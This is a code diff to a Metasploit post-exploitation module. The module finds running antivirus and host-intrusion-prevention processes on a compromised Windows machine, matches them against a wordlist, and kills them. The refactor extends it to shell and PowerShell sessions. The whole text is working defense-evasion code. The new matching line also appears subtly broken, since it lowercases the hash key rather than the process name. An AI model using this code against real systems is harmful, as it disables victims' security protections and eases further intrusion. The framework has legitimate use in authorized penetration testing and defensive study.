@@ -3,9 +3,8 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'set'
-
 class MetasploitModule < Msf::Post
+  include Msf::Post::Process
 
   def initialize(info = {})
     super(
@@ -24,7 +23,12 @@ class MetasploitModule < Msf::Post
           'OJ Reeves'
         ],
         'Platform' => ['win'],
-        'SessionTypes' => ['meterpreter'],
+        'SessionTypes' => %w[meterpreter powershell shell],
+        'Notes' => {
+          'Stability' => [OS_RESOURCE_LOSS],
+          'Reliability' => [],
+          'SideEffects' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -37,41 +41,41 @@ class MetasploitModule < Msf::Post
     )
   end
 
-  def skip_process_name?(process_name)
-    [
+  def run
+    avs = ::File.read(
+      ::File.join(
+        Msf::Config.data_directory,
+        'wordlists',
+        'av_hips_executables.txt'
+      )
+    )
+    avs = avs.strip.downcase.split("\n").uniq
+
+    skip_processes = [
       '[system process]',
       'system'
-    ].include?(process_name)
-  end
+    ]
 
-  def run
-    avs = ::File.read(::File.join(Msf::Config.data_directory, 'wordlists',
-                                  'av_hips_executables.txt')).strip
-    avs = Set.new(avs.split("\n"))
+    av_processes = get_processes.reject { |p| skip_processes.include?(p['name'].downcase) }.keep_if { |p| avs.include?(p['name'.downcase]) }
+    if av_processes.length == 0
+      print_status('No target processes were found.')
+      return
+    end
 
-    processes_found = 0
     processes_killed = 0
-    client.sys.process.get_processes().each do |x|
-      next if skip_process_name?(x['name'].downcase)
+    av_processes.each do |x|
+      process_name = x['name']
+      pid = x['pid']
 
-      vprint_status("Checking #{x['name'].downcase} ...")
-      if avs.include?(x['name'].downcase)
-        processes_found += 1
-        print_status("Attempting to terminate '#{x['name']}' (PID: #{x['pid']}) ...")
-        begin
-          client.sys.process.kill(x['pid'])
-          processes_killed += 1
-          print_good("#{x['name']} terminated.")
-        rescue Rex::Post::Meterpreter::RequestError
-          print_error("Failed to terminate '#{x['name']}' (PID: #{x['pid']}).")
-        end
+      print_status("Attempting to terminate '#{process_name}' (PID: #{pid}) ...")
+      if kill_process(pid)
+        processes_killed += 1
+        print_good("#{process_name} (PID: #{pid}) terminated.")
+      else
+        print_error("Failed to terminate '#{process_name}' (PID: #{pid}).")
       end
     end
 
-    if processes_found == 0
-      print_status('No target processes were found.')
-    else
-      print_good("A total of #{processes_found} process(es) were discovered, #{processes_killed} were terminated.")
-    end
+    print_good("A total of #{av_processes.length} process(es) were discovered, #{processes_killed} were terminated.")
   end
 end
